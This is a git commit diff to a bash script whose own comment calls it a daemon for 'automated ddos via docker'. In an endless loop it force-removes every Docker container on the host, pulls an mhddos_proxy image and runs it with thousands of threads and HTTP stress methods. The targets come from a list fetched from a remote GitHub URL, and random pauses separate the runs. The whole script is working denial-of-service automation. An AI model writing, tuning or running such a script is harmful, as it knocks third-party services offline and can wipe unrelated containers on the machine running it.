d2900f3e0abeec53a6499d09fc88b7e7dbdb888f
ukrainian_warrior_vm <ukraine.livesforever@gmail.com>
2022-04-22 22:06:52 +0300

    Fixed some issues regarding execution as systemd service

--- automation-script.sh
+++ automation-script.sh
@@ -1,24 +1,26 @@
 #!/bin/bash
-#Prepared script for use as a system deamon in unix-based systems for automated 
+#Prepared script for use as a system deamon in unix-based systems for automated ddos via docker
 
 duration="10m"
-threads_count="-t 5000"
+threads_count="-t 2000"
 targets_source="-c https://raw.githubusercontent.com/uawarrior/project1/main/trgts0.txt"
-more_params="--table --http-methods GET STRESS"
+more_params="-p 900 --debug --http-methods GET STRESS"
 
 echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Start: Removing any existing docker containers"
-sudo docker rm -f $(sudo docker ps -a -q)
+docker rm -f $(docker ps -a -q)
 
 while [ 1 == 1 ]
 do
 	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running: Updating the docker image and starting the execution for $duration"
-	sudo docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest
-	terminal -e "sudo docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $targets_source $threads_count $more_params"
+	docker pull ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest
+	#The following method doesnt work as it either cant connect to tty for interactive session while run from root, or cant call docker commands while run from user with tty...
+	#gnome-terminal --command="docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $targets_source $threads_count $more_params"
+	docker run --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest $targets_source $threads_count $more_params &> /home/admuser/daemon-prep/mhd.log &
 	sleep $duration
 
 	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Running: Removing the container"
-	sudo docker rm -f $(sudo docker ps -a -q)
-	chill_delay="$(shuf -i 3-8 -n 1)m"
+	docker rm -f $(docker ps -a -q)
+	chill_delay="$(shuf -i 4-7 -n 1)m"
 	echo -e "[\033[1;32m$(date +"%d-%m-%Y %T")\033[1;0m] - Pause: Chilling for $chill_delay"
 	sleep $chill_delay
 done
